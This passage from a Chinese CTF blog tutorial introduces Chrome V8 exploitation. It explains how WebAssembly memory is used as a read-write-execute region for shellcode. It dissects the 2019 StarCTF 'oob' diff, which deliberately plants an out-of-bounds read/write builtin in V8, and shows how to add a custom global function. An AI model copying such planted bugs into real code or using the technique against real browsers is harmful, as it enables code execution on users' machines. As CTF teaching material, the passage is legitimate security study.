src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250226122039724.png" alt="image-20250226122039724"></p><h2 id="js类型混淆"><a class="markdownIt-Anchor" href="#js类型混淆"></a> JS类型混淆</h2><h2 id="wasmwebassembly"><a class="markdownIt-Anchor" href="#wasmwebassembly"></a> WASM（WebAssembly）</h2><ul><li><code>WASM</code>，就是在<code>web</code>上的汇编。即<code>Asm on the web</code>。</li><li><code>WASM</code>最重要的一点就是可以创建一个<code>可读、可写、可执行</code>的内存空间，这时就可以用于执行我们的<code>shellcode</code>，这里注意，并不能使用<code>WASM</code>来执来汇编后执行<code>shellcode</code>，我们使用<code>WASM</code>的目的其实是开辟一个<code>可读可写可执行</code>的内存段，之后我们再通过漏洞才能将<code>shellcode</code>写入到<code>WASM</code>这个内存中，这样才能执行。</li><li>相应的方法有：<ul><li><code>WebAssembly.Module()</code>：创建一个新的<code>WebAssembly</code>模块对象(其实就是新建一个类，并没有实例成对象)。</li><li><code>WebAssembly.Instance()</code>：创建一个新的 <code>WebAssembly</code> 实例对象（这个时候就会创建一个新对象，就像<code>new Array</code>，已经将类载入到内存中，我们可以使用）。</li><li><code>WebAssembly.Memory()</code>：创建一个新的<code>WebAssembly</code> 内存对象，这个操作会开辟内存空间，这个内存空间相当于<code>字节数组</code>，可读可写，但是不可执行。</li><li><code>WebAssembly.Table()</code>：创建一个新的 <code>WebAssembly</code> 表格对象，这个表格的作用就是动态引用存储函数，可以实现<code>虚函数表</code>之类的功能。</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="keyword">let</span> wasm_mod1 = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code)</span><br><span class="line"><span class="keyword">let</span> wasm_mod2 = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod1, &#123;&#125;);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod2.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">// 由于在新建wasm_mod1和wasm_mod2之间下不了断点，我们只能知道在执行这两个语句后就会出现一个新的可读可写可执行的内存</span></span><br></pre></td></tr></table></figure><ul><li>注意：<code>d8</code>在执行的时候本来就有一个<code>可读可写可执行</code>的段，申请到栈上的附件，而下图是新申请的一个<code>可读可写可执行</code>的内存。</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250225224336159.png" alt="image-20250225224336159"></p><h1 id="关于chrome-pwn的题型"><a class="markdownIt-Anchor" href="#关于chrome-pwn的题型"></a> 关于Chrome-pwn的题型</h1><ul><li><p><code>Chrome-pwn</code>题型有两种</p><ul><li><code>第一种</code>：一般就是对<code>v8</code>进行一些修改，人为制造出一个漏洞，然后给出<code>.diff</code>文件</li><li><code>第二种</code>：直接用<code>CVE</code>出题</li></ul></li><li><p>对于第二种就是看<code>CDVE</code>漏洞在哪，或者一步一步去牢。接下来重点分析第一种题型</p></li><li><p>对于第一种题型，出题人先会对源码进行修改，然后编写<code>.diff</code>文件。而这个<code>.diff</code>文件，是github主要用于<strong>显示代码变更</strong>，是<strong>Git版本控制系统的一部分</strong>。所以给出<code>.diff</code>文件，我们就可以从<code>.diff</code>文件中看出<strong>出题人所修改的地方</strong>，从而发现并利用漏洞。接下来就以<code>2019StarCTF oob</code>这题给的<code>.diff</code>为例子，对<code>.diff</code>的一些进行分析</p></li><li><p>下面就是该题给的<code>.diff</code>文件，接下来逐句解释一下<code>.diff</code>文件的每行代码的意思</p><ul><li>前四行是<code>Git Diff</code>格式的头部信息，用于描述<strong>对比的文件</strong>和<strong>修改信息</strong><ul><li><code>diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</code>：这里就表明了对源码中<code>/src/bootstrapper.cc</code>这个文件做了修改<ul><li><code>diff --git</code>是Git生成的差异比较标识</li><li><code>a/src/bootstrapper.cc</code>是修改前的文件，其中<code>a/</code>表示修改前的文件。</li><li><code>b/src/bootstrapper.cc</code>是修改后的文件，<code>b/</code>表示修改后的文件</li></ul></li><li><code>index b027d36..ef1002f 100644</code>：表示哈希和文件权限模式，<code>b027d36</code>修改前的哈希、<code>ef1002f</code>修改后的哈希，<code>100644</code>文件权限模式。这里的哈希仅仅只是被修改文件修改前后的哈希</li><li>第三行和第四行<code>--- a/src/bootstrapper.cc</code>、<code>+++ b/src/bootstrapper.cc</code>，表示修改前和修改后的文件路径</li></ul></li><li><code>@@ -1668,6 +1668,8 @@</code>表示改文件改动的地方：表示改动的位置和行号，从这边我们就可以得知对源码修改了<code>2</code>行<ul><li><code>-1668,6</code>：<code>-</code>表示旧代码，而<code>1668,6</code>表示<code>1668</code>行的位置往下<code>6</code>行；</li><li><code>+1668,8</code>：<code>-</code>表示新代码，而<code>1668,8</code>表示<code>1668</code>行的位置往下<code>8</code>行；</li></ul></li><li>之后的<code>@@ -1668,6 +1668,8 @@</code>之后从第<code>6</code>行到第<code>14</code>行就是展现修改后具体的代码，而有两行开头有<code>+</code>就表示是新添加的代码</li></ul></li><li><p>该<code>.diff</code>文件的剩余部分是对其它源码文件进行修改，就不做详细介绍了。</p></li></ul><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="魔改v8"><a class="markdownIt-Anchor" href="#魔改v8"></a> 魔改V8</h1><ul><li><p>参考这篇博客：<a href="https://hornos3.github.io/2024/12/01/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-1/">chrome v8 pwn 学习 (1) | CoLin’s BLOG</a></p></li><li><p>对于第一种类型的出题方式，就需要对<code>v8</code>的源码进行魔改，这里需要理解一下<code>JavaScript</code>和<code>C++</code>，这样会更容易理解，不过现在有<code>AI</code>会方便许多。</p></li><li><p>对于<code>V8</code>的开发不熟悉的需要多花费一点时间去理解和尝试，这里就先从总体开始了解，如何修改<code>V8</code>的源码编译好的<code>d8</code>中新增加一个全局函数<code>MyFunc()</code>。这个<code>MyFunc()</code>函数的主要功能就是接收用户传入的参数（可以是<code>字符串的数字</code>、<code>浮点数</code>、<code>整数</code>），返回的是传入的参数加上<code>100</code>的结果，这个结果的数据类型默认为<code>整型或者是浮点型</code>。</p></li><li><p>接下来就先给出我修改源码后的<code>.diff</code>文件，根据上面初步了解了<code>.diff</code>文件，我们从<code>.diff</code>文件这边可以了解到开发<code>V8</code>流程的其中一小部分，也就是为<code>V8</code>增加一个全局函数。</p></li><li><p>接下来是我修改源码后使用<code>git diff &gt; my_changes.diff  </code>，从这里可以了解到我们增加一个全局函数需要对源码的什么位置进行修改，接下来说明一下，具体修改了哪些文件的代码</p><ul><li><code>path/to/v8/BUILD.bazel</code></li><li><code>path/to/v8/BUILD.gn </code></li><li><code>path/to/v8/src/builtins/builtins-definitions.h</code></li><li><code>path/to/v8/src/init/bootstrapper.cc</code></li><li><code>path/to/v8/src/compiler/turbofan-typer.cc</code></li><li><strong>注意：从<code>BUILD.bazel</code>和<code>BUILD.gn</code></strong>，我们可以了解到我们还新建了一个文件，该文件为<code>path/to/v8/src/builtins/builtins-myfunc.cc</code></li></ul></li><li><p>可以先尝试一下根据<code>.diff</code>文件不用<code>git</code>命令自己尝试修改源码，然后编译，成功添加<code>MyFunc()</code>这个全局函数。也可以根据后面的操作去尝试</p></li></ul><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/BUILD.bazel b/BUILD.bazel</span></span><br><span class="line"><span class="comment">index a3c2438a030..3cd7b9c1630 100644</span></span><br><span class="line"><span class="comment">--- a/BUILD.bazel</span></span><br><span class="line"><span class="comment">+++ b/BUILD.bazel</span></span><br><span class="line"><span class="meta">@@ -1367,6 +1367,7 @@</span> filegroup(</span><br><span class="line">         &quot;src/builtins/builtins-global.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-internal.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-json.cc&quot;,</span><br><span class="line"><span class="addition">+        &quot;src/builtins/builtins-myfunc.cc&quot;,</span></span><br><span class="line">         &quot;src/builtins/builtins-number.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-object.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-promise.h&quot;,</span><br><span class="line">         </span><br><span class="line">         </span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/BUILD.gn b/BUILD.gn</span></span><br><span class="line"><span class="comment">index ba32e344142..a4e9e463898 100644</span></span><br><span class="line"><span class="comment">--- a/BUILD.gn</span></span><br><span class="line"><span class="comment">+++ b/BUILD.gn</span></span><br><span class="line"><span class="meta">@@ -5289,6 +5289,7 @@</span> v8_source_set(&quot;v8_base_without_compiler&quot;) &#123;</span><br><span class="line">     &quot;src/builtins/builtins-internal.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-intl.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-json.cc&quot;,</span><br><span class="line"><span class="addition">+    &quot;src/builtins/builtins-myfunc.cc&quot;,</span></span><br><span class="line">     &quot;src/builtins/builtins-number.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-object.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-reflect.cc&quot;,</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index c163334d7db..15e4b42fea3 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -133,6 +133,7 @@</span> namespace internal &#123;</span><br><span class="line">   IF_TSAN(TFC, TSANRelaxedStore32IgnoreFP, TSANStore)                          \</span><br><span class="line">   IF_TSAN(TFC, TSANRelaxedStore32SaveFP, TSANStore)                            \</span><br><span class="line">   IF_TSAN(TFC, TSANRelaxedStore64IgnoreFP, TSANStore)                          \</span><br><span class="line"><span class="addition">+  CPP(MyFunc, kDontAdaptArgumentsSentinel)                                     \</span></span><br><span class="line">   IF_TSAN(TFC, TSANRelaxedStore64SaveFP, TSANStore)                            \</span><br><span class="line">   IF_TSAN(TFC, TSANSeqCstStore8IgnoreFP, TSANStore)                            \</span><br><span class="line">   IF_TSAN(TFC, TSANSeqCstStore8SaveFP, TSANStore)                              \</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/src/compiler/turbofan-typer.cc b/src/compiler/turbofan-typer.cc</span></span><br><span class="line"><span class="comment">index 1b09c0f020e..998f9555256 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/turbofan-typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/turbofan-typer.cc</span></span><br><span class="line"><span class="meta">@@ -1849,6 +1849,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">     return Type::NonInternal();</span><br><span class="line">   &#125;</span><br><span class="line">   switch (function.shared(t-&gt;broker()).builtin_id()) &#123;</span><br><span class="line"><span class="addition">+    case Builtin::kMyFunc:</span></span><br><span class="line"><span class="addition">+      return Type::Number();</span></span><br><span class="line">     case Builtin::kMathRandom:</span><br><span class="line">       return Type::PlainNumber();</span><br><span class="line">     case Builtin::kMathFloor:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index d285b4e7e42..1c273e0f332 100644</span></span><br><span class="line"><span class="comment">--- a/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -2276,6 +2276,10 @@</span> void Genesis::InitializeGlobal(DirectHandle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">   native_context()-&gt;set_security_token(*global_object);</span><br><span class="line"></span><br><span class="line">   Factory* factory = isolate_-&gt;factory();</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  &#123;  // -- M y F u n c</span></span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, global_object, &quot;MyFunc&quot;, Builtin::kMyFunc, 1, kDontAdapt);</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"></span><br><span class="line">   &#123;  // -- C o n t e x t</span><br><span class="line">     DirectHandle&lt;Map&gt; meta_map(native_context()-&gt;meta_map(), isolate());</span><br><span class="line"><span class="meta">@@ -2768,6 +2772,7 @@</span> void Genesis::InitializeGlobal(DirectHandle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           DONT_ENUM);</span><br><span class="line">     native_context()-&gt;set_global_parse_int_fun(*parse_int_fun);</span><br><span class="line"></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     // Install Number constants</span><br><span class="line">     const double kMaxValue = 1.7976931348623157e+308;</span><br><span class="line">     const double kMinValue = 5e-324;</span><br><span class="line"><span class="meta">@@ -7253,5 +7258,7 @@</span> char* Bootstrapper::RestoreState(char* from) &#123;</span><br><span class="line"> // Called when the top-level V8 mutex is destroyed.</span><br><span class="line"> void Bootstrapper::FreeThreadResources() &#123; DCHECK(!IsActive()); &#125;</span><br><span class="line"></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> &#125;  // namespace internal</span><br><span class="line"> &#125;  // namespace v8</span><br></pre></td></tr></table></figure><ul><li>这里也给出参考博客中的<code>myfunc.cc</code>中的具体代码：</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/builtins/builtins-utils-inl.h&quot;</span></span></span><br><span class="line"><span class="keyword">namespace</span> v8 &#123;</span><br><span class="line"><span class="keyword">namespace</span> internal &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">BUILTIN</span>(MyFunc) &#123;</span><br><span class="line">    <span class="function">HandleScope <span class="title">scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line">    Handle&lt;Object&gt; value = args.<span class="built_in">atOrUndefined</span>(isolate, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断参数是否为基本类型</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsJSPrimitiveWrapper</span>(*value)) &#123;</span><br><span class="line">        value = <span class="built_in">handle</span>(<span class="built_in">Cast</span>&lt;JSPrimitiveWrapper&gt;(value)-&gt;<span class="built_in">value</span>(), isolate);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断参数是否为数字</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">IsNumber</span>(*value)) &#123;</span><br><span class="line">        <span class="built_in">THROW_NEW_ERROR_RETURN_FAILURE</span>(</span><br><span class="line">                isolate, <span class="built_in">NewTypeError</span>(MessageTemplate::kArgumentIsNotUndefinedOrInteger,</span><br><span class="line">                                      isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewStringFromAsciiChecked</span>(</span><br><span class="line">                                              <span class="string">&quot;My.Func&quot;</span>),</span><br><span class="line">                                      isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">Number_string</span>()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将Object转换为浮点数</span></span><br><span class="line">    <span class="type">double</span> <span class="type">const</span> value_number = Object::<span class="built_in">NumberValue</span>(*value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> *isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewNumber</span>(value_number + <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>修改完编译后就可以得到我们自定义的一个全局函数</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217195916950.png" alt="image-20250217195916950"></p><ul><li>我们就先来介绍一下添加全局函数要修改的这些文件</li></ul><h2 id="相关文件"><a class="markdownIt-Anchor" href="#相关文件"></a> 相关文件</h2><ul><li>下面均为<code>V8 version 13.5.0</code>的源码</li></ul><h3 id="buildbazel和buildgn"><a class="markdownIt-Anchor" href="#buildbazel和buildgn"></a> <a 